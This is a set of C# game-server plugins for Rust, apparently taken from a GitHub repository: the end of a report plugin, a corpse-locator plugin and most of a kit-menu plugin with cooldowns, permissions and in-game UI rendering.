                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Hours, "hours'", "hour's", "hour")}";
                        i2++;
                    }

                    if (time.Minutes != 0 && i2 < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Minutes, "minutes", "minutes", "minute")}";
                        i2++;
                    }

                    if (time.Seconds != 0 && i2 < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Seconds, "second", "seconds", "second")}";
                        i2++;
                    }

                    break;
                }
            }

            return result;
        }

        [PluginReference] private Plugin ImageLibrary;

        public string GetImage(string shortname, ulong skin = 0) =>
            (string) ImageLibrary.Call("GetImage", shortname, skin);

        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex)) hex = "#FFFFFFFF";
            var str = hex.Trim('#');
            if (str.Length == 6) str += "FF";
            if (str.Length != 8)
            {
                throw new Exception(hex);
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);
            Color color = new Color32(r, g, b, a);
            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }

        private void ReplySend(BasePlayer player, string message) => player.SendConsoleCommand("chat.add 0",
            new object[2]
                {76561199015371818, $"<size=18><color=purple>SoReport</color></size>\n{message}"});

        private static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        private static double CurrentTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        #endregion
    }
}

// --- End of file: SoReport.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/WheresMyCorpse.cs ---
// --- Original Local Path: WheresMyCorpse.cs ---

using System;
using System.Text;
using System.Collections.Generic;
using Oxide.Core;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Where's My Corpse", "LeoCurtss", 0.5)]
    [Description("Points a player to their corpse when they type a command.")]

    class WheresMyCorpse : RustPlugin
    {
		
        void Loaded()
        {
            LoadData();
			
			permission.RegisterPermission("wheresmycorpse.canuse", this);
			
			//Lang API dictionary
			lang.RegisterMessages(new Dictionary<string,string>{
				["WMC_NoData"] = "No data was found on your last death.  The WheresMyCorpse plugin may have been reloaded or you have not died yet.",
				["WMC_LastSeen"] = "Your corpse was last seen {0} meters from here.",
				["WMC_NoPermission"] = "You do not have permission to use that command."
			}, this);
        }
		
		private string GetMessage(string name, string sid = null) {
			return lang.GetMessage(name, this, sid);
		}
		
		Dictionary<string, string> deathInfo = new Dictionary<string, string>();

		void LoadData()
		{
			deathInfo = Interface.GetMod().DataFileSystem.ReadObject<Dictionary<string, string>>("WheresMyCorpse");
		}

		void SaveData()
		{
			Interface.GetMod().DataFileSystem.WriteObject("WheresMyCorpse", deathInfo);
		}

		void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
		{
			
			if (entity.name.Contains("player.prefab"))
			{
				var player = entity as BasePlayer;
				
				string UserID = player.UserIDString;
				string DeathPosition = entity.GetEstimatedWorldPosition().ToString();
				
				Puts("Player death info: " + UserID + " at " + DeathPosition);
				
				LoadData();
				
				string value;
				
				if (deathInfo.TryGetValue(UserID, out value))
				{
					deathInfo[UserID] = DeathPosition;
					SaveData();
				}
				else
				{
					deathInfo.Add(UserID,DeathPosition);
					SaveData();
				}
			}
		}
		
		void OnPlayerRespawned(BasePlayer player)
		{
            if (permission.UserHasPermission(player.userID.ToString(), "wheresmycorpse.canuse"))
			{
				if (deathInfo.ContainsKey(player.UserIDString))
				{
					Vector3 lastDeathPosition = getVector3(deathInfo[player.UserIDString]);
					Vector3 currentPosition = player.transform.position;
					
					float distanceToCorpse = Vector3.Distance(lastDeathPosition,currentPosition);
					
					SendReply(player,string.Format(GetMessage("WMC_LastSeen",player.UserIDString),distanceToCorpse.ToString("0")));
					drawArrow(player,60.0f);
				}
				else
				{
					SendReply(player,GetMessage("WMC_NoData",player.UserIDString));
				}
			}
		}
		
		[ChatCommand("where")]
        void TestCommand(BasePlayer player, string command, string[] args)
        {
            if (permission.UserHasPermission(player.userID.ToString(), "wheresmycorpse.canuse"))
			{
				if (deathInfo.ContainsKey(player.UserIDString))
				{
					Vector3 lastDeathPosition = getVector3(deathInfo[player.UserIDString]);
					Vector3 currentPosition = player.transform.position;
					
					float distanceToCorpse = Vector3.Distance(lastDeathPosition,currentPosition);
					
					SendReply(player,string.Format(GetMessage("WMC_LastSeen",player.UserIDString),distanceToCorpse.ToString("0")));
					drawArrow(player,30.0f);
				}
				else
				{
					SendReply(player,GetMessage("WMC_NoData",player.UserIDString));
				}
			}
			else
			{
				SendReply(player,GetMessage("WMC_NoPermission",player.UserIDString));
			}
        }
		
		void drawArrow(BasePlayer player, float duration)
		{
			Vector3 lastDeathPosition = getVector3(deathInfo[player.UserIDString]);
			Vector3 currentPosition = player.transform.position;
			
			float distanceToCorpse = Vector3.Distance(lastDeathPosition,currentPosition);
			
			Vector3 arrowBasePosition = LerpByDistance(currentPosition + new Vector3(0, 1, 0),lastDeathPosition + new Vector3(0, 1, 0),3);
			Vector3 arrowPointPosition = LerpByDistance(currentPosition + new Vector3(0, 1, 0),lastDeathPosition + new Vector3(0, 1, 0),6);
			
			Vector3 beaconBasePosition = lastDeathPosition;
			Vector3 beaconPointPosition = lastDeathPosition + new Vector3(0, 1000, 0);
			
			Color arrowColor = new Color(1, 0, 0, 1);
			Color textColor = new Color(1,0,0,1);
			Color beaconColor = new Color(1,0,0,1);
			player.SendConsoleCommand("ddraw.arrow", duration, arrowColor, arrowBasePosition, arrowPointPosition, 0.5f);
			player.SendConsoleCommand("ddraw.text", duration, textColor, arrowBasePosition, "Distance: " + distanceToCorpse.ToString("0") + " meters");
			player.SendConsoleCommand("ddraw.arrow", duration, arrowColor, beaconBasePosition, beaconPointPosition, 1.0f);
		}
		
		public Vector3 getVector3(string rString){
			string[] temp = rString.Substring(1,rString.Length-2).Split(',');
			float x = float.Parse(temp[0]);
			float y = float.Parse(temp[1]);
			float z = float.Parse(temp[2]);
			Vector3 rValue = new Vector3(x,y,z);
			return rValue;
		}
		
		public Vector3 LerpByDistance(Vector3 A, Vector3 B, float x)
		{
			Vector3 P = x * Vector3.Normalize(B - A) + A;
			return P;
		}
    }
}

// --- End of file: WheresMyCorpse.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/RustKits.cs ---
// --- Original Local Path: RustKits.cs ---

﻿using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("RustKits", "VooDoo", "1.0.0")]
    [Description("Menu for RUST")]
    public class RustKits : RustPlugin
    {
        private static RustKits Instance;
        [PluginReference] Plugin XMenu;
        [PluginReference] Plugin ImageLibrary;
        [PluginReference] Plugin Notifications;

        private bool AddImage(string url, string imageName, ulong imageId = 0, Action callback = null) => (bool)ImageLibrary.Call("AddImage", url, imageName, imageId, callback);
        private string GetImage(string imageName, ulong imageId = 0, bool returnUrl = false) => (string)ImageLibrary.Call("GetImage", imageName, imageId, returnUrl);

        #region Data
        private List<Kit> _kits = new List<Kit>();
        private Dictionary<ulong, Dictionary<string, KitData>> _kitsData = new Dictionary<ulong, Dictionary<string, KitData>>();

        public class KitData
        {
            public int Amount { get; set; }
            public double Cooldown { get; set; }
        }

        public class Kit
        {
            public string Name { get; set; }
            public string Image { get; set; }
            public string Permission { get; set; }
            public int Amount { get; set; }
            public double Cooldown { get; set; }
            public List<KitItem> Items { get; set; }
        }

        public class KitItem
        {
            public string Name { get; set; }
            public string Container { get; set; }
            public int Amount { get; set; }
            public ulong SkinID { get; set; }
            public float Condition { get; set; }
            public Weapon Weapon { get; set; }
        }

        public class Weapon
        {
            public string AmmoName { get; set; }
            public int Amount;

            public List<string> Content { get; set; }
        }      

        private List<Kit> GetKitsForPlayer(BasePlayer player)
        {
            return _kits.Where(kit => kit.Name != "autokit" && (string.IsNullOrEmpty(kit.Permission) || permission.UserHasPermission(player.UserIDString, kit.Permission)) && (kit.Amount == 0 || (kit.Amount > 0 && GetKitData(player, kit.Name).Amount < kit.Amount))).ToList();
        }

        private KitData GetKitData(BasePlayer player, string kitName)
        {
            Dictionary<string, KitData> kitDictionary;
            if (_kitsData.TryGetValue(player.userID, out kitDictionary))
            {
                KitData kitData;
                if (kitDictionary.TryGetValue(kitName, out kitData))
                {
                    return kitData;
                }
                else
                {
                    _kitsData[player.userID][kitName] = new KitData();
                    return _kitsData[player.userID][kitName];
                }
            }
            else
            {
                _kitsData[player.userID] = new Dictionary<string, KitData>();
                _kitsData[player.userID][kitName] = new KitData();
                return _kitsData[player.userID][kitName];
            }
        }

        private List<KitItem> GetPlayerItems(BasePlayer player)
        {
            List<KitItem> kititems = new List<KitItem>();
            foreach (Item item in player.inventory.containerWear.itemList)
            {
                if (item != null)
                {
                    var iteminfo = ItemToKit(item, "wear");
                    kititems.Add(iteminfo);
                }
            }
            foreach (Item item in player.inventory.containerMain.itemList)
            {
                if (item != null)
                {
                    var iteminfo = ItemToKit(item, "main");
                    kititems.Add(iteminfo);
                }
            }
            foreach (Item item in player.inventory.containerBelt.itemList)
            {
                if (item != null)
                {
                    var iteminfo = ItemToKit(item, "belt");
                    kititems.Add(iteminfo);
                }
            }
            return kititems;
        }

        private KitItem ItemToKit(Item item, string container)
        {
            KitItem kitItem = new KitItem();
            kitItem.Amount = item.amount;
            kitItem.Container = container;
            kitItem.SkinID = item.skin;
            kitItem.Name = item.info.shortname;
            kitItem.Condition = item.condition;
            kitItem.Weapon = null;
            if (item.info.category == ItemCategory.Weapon)
            {
                BaseProjectile weapon = item.GetHeldEntity() as BaseProjectile;
                if (weapon != null)
                {
                    kitItem.Weapon = new Weapon();
                    kitItem.Weapon.AmmoName = weapon.primaryMagazine.ammoType.shortname;
                    kitItem.Weapon.Amount = weapon.primaryMagazine.contents;
                    
                    if (item.contents != null)
                    {
                        kitItem.Weapon.Content = new List<string>();
                        foreach (var content in item.contents.itemList)
                        {
                            kitItem.Weapon.Content.Add(content.info.shortname);
                        }
                    }


                }
            }
            return kitItem;
        }
        #endregion

        #region UnityMod Hooks
        private void OnPlayerRespawned(BasePlayer player)
        {
            if(_kits.Exists(x => x.Name == "AUTOKIT".ToLower()))
            {
                player.inventory.Strip();
                var kit = _kits.First(x => x.Name == "AUTOKIT".ToLower());
                GiveKit(player, kit);
			
            }
        }

        private void SaveKits()
        {
            Interface.Oxide.DataFileSystem.WriteObject("Kits", _kits);
        }

        private void SaveData()
        {
            Interface.Oxide.DataFileSystem.WriteObject("Kits_Data", _kitsData);
        }

        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>()
            {
                ["TITLE"] = "<color=#fffffAA>List of KITS</color>",
                ["TIMER"] = "Timer",
                ["TITLE_CAN"] = "Available",
                ["BUTTON_CAN"] = "Receive",
                ["BUTTON_CANT"] = "Wait",
                ["KIT_NOTFOUND"] = "This kit does not exist",
                ["KIT_PERMISSION"] = "You are not authorized to use this kit",
                ["KIT_TIME"] = "You will be able to use this kit through {time}",
                ["KIT_NEEDSLOTS"] = "Unable to get kit - not enough space in inventory",
                ["KIT_RECEIVED"] = "You received the kit {kitname}",
                ["TITLE_KITSHOW"] = "<color=#fffffAA>List items of kit <color=#FFAA00AA>%</color></color>",
            }, this, "en");

            lang.RegisterMessages(new Dictionary<string, string>()
            {
                ["TITLE"] = "<color=#fffffAA>Список китов нашего сервера</color>",
                ["TIMER"] = "Таймер",
                ["TITLE_CAN"] = "Доступно",
                ["BUTTON_CAN"] = "Взять",
                ["BUTTON_CANT"] = "Подождите",
                ["KIT_NOTFOUND"] = "Этого набора не существует",
                ["KIT_PERMISSION"] = "У вас нет полномочий использовать этот набор",
                ["KIT_TIME"] = "Вы сможете использовать этот набор через {time}",
                ["KIT_NEEDSLOTS"] = "Невозможно получить набор - недостаточно места в инвентаре",
                ["KIT_RECEIVED"] = "Вы получили набор {kitname}",
                ["TITLE_KITSHOW"] = "<color=#fffffAA>Список содержимого набора <color=#FFAA00AA>%</color></color>",
            }, this, "ru");
        }

        private Timer initTimer;
        private void OnServerInitialized()
        {
            Instance = this;

            _kits = Interface.Oxide.DataFileSystem.ReadObject<List<Kit>>("Kits");
            _kitsData = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, Dictionary<string, KitData>>>("Kits_Data");

            for(int i = 0; i < _kits.Count; i++)
            {
                AddImage("file://" + Interface.Oxide.DataDirectory + Path.DirectorySeparatorChar + "Kits" + Path.DirectorySeparatorChar + _kits[i].Image, _kits[i].Name);
                permission.RegisterPermission(_kits[i].Permission, this);
            }

            initTimer = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterSubMenu", this.Name, "Main", "Киты", "RenderKits", null);

                    int kitsID = (int)XMenu.Call("API_GetSubMenuID", "Main", "Киты");
                    cmd.AddChatCommand("kit", this, (p, cmd, args) => rust.RunClientCommand(p, $"custommenu true Main {kitsID}"));

                    initTimer.Destroy();
                }
            });

        }

        private void Unload()
        {
            SaveData();
        }

        [ConsoleCommand("kitadd")]
        private void AddKitCmd(ConsoleSystem.Arg arg)
        {
            if (arg.IsAdmin)
            {
                Kit kit = new Kit()
                {
                    Name = "New Kit",
                    Amount = 0,
                    Cooldown = 100000,
                    Image = "rust.png",
                    Items = new List<KitItem>(),
                    Permission = "RustKits.hide"
                };

                for(int i = 0; i < arg.Player().inventory.containerBelt.itemList.Count; i++)
                {
                    KitItem kitItem = new KitItem()
                    {
                        Container = "belt",
                        Amount = arg.Player().inventory.containerBelt.itemList[i].amount,
                        Name = arg.Player().inventory.containerBelt.itemList[i].info.shortname,
                        SkinID = arg.Player().inventory.containerBelt.itemList[i].skin,
                        Condition = arg.Player().inventory.containerBelt.itemList[i].condition,
                    };

                    if (arg.Player().inventory.containerBelt.itemList[i].info.category == ItemCategory.Weapon)
                    {
                        BaseProjectile weapon = arg.Player().inventory.containerBelt.itemList[i].GetHeldEntity() as BaseProjectile;
                        if (weapon != null)
                        {
                            kitItem.Weapon = new Weapon();
                            kitItem.Weapon.AmmoName = weapon.primaryMagazine.ammoType.shortname;
                            kitItem.Weapon.Amount = weapon.primaryMagazine.contents;
                        }
                    }

                    kit.Items.Add(kitItem);
                }

                for (int i = 0; i < arg.Player().inventory.containerMain.itemList.Count; i++)
                {
                    KitItem kitItem = new KitItem()
                    {
                        Container = "main",
                        Amount = arg.Player().inventory.containerMain.itemList[i].amount,
                        Name = arg.Player().inventory.containerMain.itemList[i].info.shortname,
                        SkinID = arg.Player().inventory.containerMain.itemList[i].skin,
                        Condition = arg.Player().inventory.containerMain.itemList[i].condition,
                    };

                    if (arg.Player().inventory.containerMain.itemList[i].info.category == ItemCategory.Weapon)
                    {
                        BaseProjectile weapon = arg.Player().inventory.containerMain.itemList[i].GetHeldEntity() as BaseProjectile;
                        if (weapon != null)
                        {
                            kitItem.Weapon = new Weapon();
                            kitItem.Weapon.AmmoName = weapon.primaryMagazine.ammoType.shortname;
                            kitItem.Weapon.Amount = weapon.primaryMagazine.contents;
                        }
                    }

                    kit.Items.Add(kitItem);
                }

                for (int i = 0; i < arg.Player().inventory.containerWear.itemList.Count; i++)
                {
                    KitItem kitItem = new KitItem()
                    {
                        Container = "wear",
                        Amount = arg.Player().inventory.containerWear.itemList[i].amount,
                        Name = arg.Player().inventory.containerWear.itemList[i].info.shortname,
                        SkinID = arg.Player().inventory.containerWear.itemList[i].skin,
                        Condition = arg.Player().inventory.containerWear.itemList[i].condition,
                    };

                    if (arg.Player().inventory.containerWear.itemList[i].info.category == ItemCategory.Weapon)
                    {
                        BaseProjectile weapon = arg.Player().inventory.containerWear.itemList[i].GetHeldEntity() as BaseProjectile;
                        if (weapon != null)
                        {
                            kitItem.Weapon = new Weapon();
                            kitItem.Weapon.AmmoName = weapon.primaryMagazine.ammoType.shortname;
                            kitItem.Weapon.Amount = weapon.primaryMagazine.contents;
                        }
                    }

                    kit.Items.Add(kitItem);
                }


                _kits.Add(kit);
                SaveKits();
            }

        }

        [ConsoleCommand("kit")]
        private void GiveKitCmd(ConsoleSystem.Arg args)
        {
            BasePlayer player = args.Player();
            if (args.HasArgs(4))
            {
                string kitName = args.Args[0];
                int i = int.Parse(args.Args[1]);
                int positionX = int.Parse(args.Args[2]);
                int positionY = int.Parse(args.Args[3]);

                if(_kits.Exists(x => x.Name == kitName) == false)
                {;
                    return;
                }

                var kit = _kits.First(x => x.Name == kitName);
                if(string.IsNullOrEmpty(kit.Permission) == false && permission.UserHasPermission(player.UserIDString, kit.Permission) == false)
                {
                    return;
                }

                var kitData = GetKitData(player, kitName);
                if (kit.Amount > 0 && kitData.Amount >= kit.Amount)
                {
                    return;
                }

                if (kit.Cooldown > 0)
                {
                    var currentTime = GetCurrentTime();
                    if (kitData.Cooldown > currentTime)
                    {
                        return;
                    }
                }

                int beltcount = kit.Items.Where(j => j.Container == "belt").Count();
                int wearcount = kit.Items.Where(j => j.Container == "wear").Count();
                int maincount = kit.Items.Where(j => j.Container == "main").Count();
                int totalcount = beltcount + wearcount + maincount;

                if ((player.inventory.containerBelt.capacity - player.inventory.containerBelt.itemList.Count) < beltcount ||
                    (player.inventory.containerWear.capacity - player.inventory.containerWear.itemList.Count) < wearcount ||
                    (player.inventory.containerMain.capacity - player.inventory.containerMain.itemList.Count) < maincount)
                {
                    if (totalcount > (player.inventory.containerMain.capacity - player.inventory.containerMain.itemList.Count))
                    {
                        return;
                    }
                }

                GiveKit(player, kit);

                if (kit.Amount > 0)
                    kitData.Amount += 1;

                if (kit.Cooldown > 0)
                    kitData.Cooldown = GetCurrentTime() + kit.Cooldown;
                CuiElementContainer Container = new CuiElementContainer();
                RenderKit(player, Container, GetKitsForPlayer(player), i, positionX, positionY);
                CuiHelper.AddUi(player, Container);
            }
        }
		
        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";
		
        private void RenderKits(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
			BasePlayer player = BasePlayer.FindByID(userID);
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];
			
			Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-215 -230",
                            OffsetMax = "500 270"
                        },
                    }
            });
			
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content" + ".Kits",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = "0 0 0 0",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content"  + $".Title",
                Parent = "XMenu" + ".Content" + ".Kits",
                Components =
                    {
                        new CuiTextComponent
                        {
                            Text = lang.GetMessage("TITLE", this, player.UserIDString),
                            Align = TextAnchor.MiddleCenter,
                            FontSize = 36,
                            Font = "robotocondensed-bold.ttf",
                            FadeIn = 0.5f,
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 1",
                            AnchorMax = "0.5 1",
                            OffsetMin = $"-275 -100",
                            OffsetMax = $"275 0",
                        }
                    }
            });
            List<Kit> Kits = GetKitsForPlayer(player);
            for (int i = 0, x = 0, y = 0; i < Kits.Count; i++)
            {
                if (x == 3)
                {
                    x = 0;
                    y++;
                }
                RenderKit(player, Container, Kits, i, x, y);
                x++;
            }
        }

        private void RenderKit(BasePlayer player, CuiElementContainer Container, List<Kit> Kits, int number, int positionX, int positionY)
        {
            CuiHelper.DestroyUi(player, "XMenu" + ".Content"  + $"Kit.{number}");
            double Cooldown = (GetCurrentTime() - GetKitData(player, Kits[number].Name).Cooldown) * -1;
            string Time = TimeExtensions.FormatShortTime(TimeSpan.FromSeconds(Cooldown));
            string BtnColor = "1 0.22 0.15 0.3";
            if (Cooldown < 0) BtnColor = "0.66 1 0.3 0.2";
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content"  + $"Kit.{number}",
                Parent = "XMenu" + ".Content" + ".Kits",
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = "0 0 0 0.5",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0.5 1",
                                    AnchorMax = "0.5 1",
                                    OffsetMin = $"{-300 + positionX * 205} {-200 - positionY * 105}",
                                    OffsetMax = $"{-105 + positionX * 205} {-100 - positionY * 105}"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content"  + $"Kit.{number}.Background",
                Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                Components =
                                {
                                    new CuiImageComponent
                                    {
                                        Color = "1 1 1 0.05",
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0.025 0.05",
                                        AnchorMax = "0.475 0.95",
                                    }
                                }
            });
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content"  + $"Kit.{number}.Img",
                Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                Components =
                            {
                                new CuiRawImageComponent
                                {
                                    FadeIn = 0.5f,
                                    Png = GetImage(Kits[number].Name),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0.025 0.05",
                                    AnchorMax = "0.475 0.95",
                                }
                            }
            });
            Container.Add(new CuiButton
            {
                Button = { Color = "1 1 1 0", Command = $"kitshow {Kits[number].Name}" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, "XMenu" + ".Content"  + $"Kit.{number}.Img");
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content"  + $"Kit.{number}.Title",
                Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color=#fff9f9AA>{Kits[number].Name}</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 12,
                                    Font = "robotocondensed-bold.ttf",
                                    FadeIn = 0.5f,
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0.5 0.7",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content"  + $"Kit.{number}.BtnBackground",
                Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = BtnColor,
                                    FadeIn = 0.5f,
                                    Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0.525 0.05",
                                    AnchorMax = "0.95 0.3",
                                },
                            }
            });
            if (Cooldown > 0)
            {
                Container.Add(new CuiElement
                {
                    Name = "XMenu" + ".Content"  + $"Kit.{number}.Timer",
                    Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                    Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color=#fff9f9AA>{lang.GetMessage("TIMER", this, player.UserIDString)}:\n {Time}</color>",
                                        Align = TextAnchor.LowerCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-bold.ttf",
                                        FadeIn = 0.5f,
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0.5 0.35",
                                        AnchorMax = "1 0.7",
                                    }
                                }
                });
                Container.Add(new CuiElement
                {
                    Name = "XMenu" + ".Content"  + $"Kit.{number}.BtnTitle",
                    Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                    Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color=#fff9f9AA>{lang.GetMessage("BUTTON_CANT", this, player.UserIDString)}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-bold.ttf",
                                        FadeIn = 0.5f,
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0.525 0.05",
                                        AnchorMax = "0.95 0.3",
                                    }
                                }
                });
            }
            else
            {
                Container.Add(new CuiElement
                {
                    Name = "XMenu" + ".Content"  + $"Kit.{number}.Timer",
                    Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                    Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color=#fff9f9AA>{lang.GetMessage("TITLE_CAN", this, player.UserIDString)}</color>",
                                        Align = TextAnchor.LowerCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-bold.ttf",
                                        FadeIn = 0.5f,
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0.5 0.35",
                                        AnchorMax = "1 0.7",
                                    }
                                }
                });
                Container.Add(new CuiElement
                {
                    Name = "XMenu" + ".Content"  + $"Kit.{number}.BtnTitle",
                    Parent = "XMenu" + ".Content"  + $"Kit.{number}",
                    Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color=#fff9f9AA>{lang.GetMessage("BUTTON_CAN", this, player.UserIDString)}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-bold.ttf",
                                        FadeIn = 0.5f,
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0.525 0.05",
                                        AnchorMax = "0.95 0.3",
                                    }
                                }
                });
                Container.Add(new CuiButton
                {
                    Button = { Color = "1 1 1 0", Command = $"kit {Kits[number].Name} {number} {positionX} {positionY}" },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "", Align = TextAnchor.MiddleCenter }
                }, "XMenu" + ".Content"  + $"Kit.{number}.BtnTitle");
            }
        }

        [ConsoleCommand("kitshow")]
        void CaseShowCmd(ConsoleSystem.Arg arg)
        {
            if (arg.HasArgs())
            {
                if (arg.Args[0] == "close")
                {
                    CuiHelper.DestroyUi(arg.Player(), "XMenu" + ".Content" );

                    return;
                }
                Kit _kit = _kits.Find(x => x.Name == arg.Args[0]);
                if (_kit == null)
                {
                    Notifications.Call("API_AddUINote", arg.Connection.userid, $"Не найден набор с таким именем");
                    return;
                }

                RenderKitInfo(arg.Player(), _kit);
            }
        }

        private void RenderKitInfo(BasePlayer player, Kit kit)
        {
            CuiHelper.DestroyUi(player, "XMenu" + ".Content" + ".Kits");
            CuiElementContainer Container = new CuiElementContainer();
            Container.Add(new CuiElement
            {
                Name = "XMenu" + ".Content"  + $".Title",
                Parent = "XMenu" + ".Content" ,
                Components =
                    {
                        new CuiTextComponent
                        {
                            Text = lang.GetMessage("TITLE_KITSHOW", this, player.UserIDString).Replace("%", kit.Name),
                            Align = TextAnchor.MiddleCenter,
                            FontSize = 24,
                            Font = "robotocondensed-bold.ttf",
                            FadeIn = 0.5f,
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 1",
                            AnchorMax = "0.5 1",
                            OffsetMin = $"-275 -75",
                            OffsetMax = $"275 0",
                        }
                    }
            });

            for(int i = 0, x = 0, y = 0; i < kit.Items.Count; i++)
            {
                if(x > 5)
                {
                    x = 0;
                    y++;
                }
                if (ItemManager.itemDictionaryByName.ContainsKey(kit.Items[i].Name))
                {
                    Container.Add(new CuiElement
                    {
                        Name = "XMenu" + ".Content"  + $"Kit.Info.Item{i}.Background",
                        Parent = "XMenu" + ".Content" ,
                        Components =
                                {
                                    new CuiImageComponent
                                    {
                                        Color = "1 1 1 0.05",
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0.5 1",
                                        AnchorMax = "0.5 1",
                                        OffsetMin = $"{-275 + x * 90} {-155 - y * 90}",
                                        OffsetMax = $"{-195 + x * 90} {-75 - y * 90}",
                                    }
                                }
                    });

                    Container.Add(new CuiElement
                    {
                        Name = "XMenu" + ".Content"  + $"Kit.Info.Item{i}.Background.Img",
                        Parent = "XMenu" + ".Content"  + $"Kit.Info.Item{i}.Background",
                        Components =
                            {
                                new CuiRawImageComponent
                                {
                                    FadeIn = 0.5f,
                                    Png = GetImage(kit.Items[i].Name),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0.1 0.1",
                                    AnchorMax = $"0.9 0.9",
                                }
                            }
                    });

                    Container.Add(new CuiElement
                    {
                        Name = "XMenu" + ".Content"  + $"Kit.Info.Item{i}.Background.Amount",
                        Parent = "XMenu" + ".Content"  + $"Kit.Info.Item{i}.Background",
                        Components =
                        {
                            new CuiTextComponent
                            {
                                Text = kit.Items[i].Amount + " шт",
                                Align = TextAnchor.MiddleCenter,
                                FontSize = 12,
                                Font = "robotocondensed-bold.ttf",
                                FadeIn = 0.5f,
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = $"0 0",
                                AnchorMax = $"1 0.3",
                            }
                        }
                    });
                    x++;
                }
            }

            CuiHelper.AddUi(player, Container);
        }

        private void GiveKit(BasePlayer player, Kit kit)
        {
            foreach (var kitItem in kit.Items)
            {
                if (ItemManager.itemDictionaryByName.ContainsKey(kitItem.Name))
                {
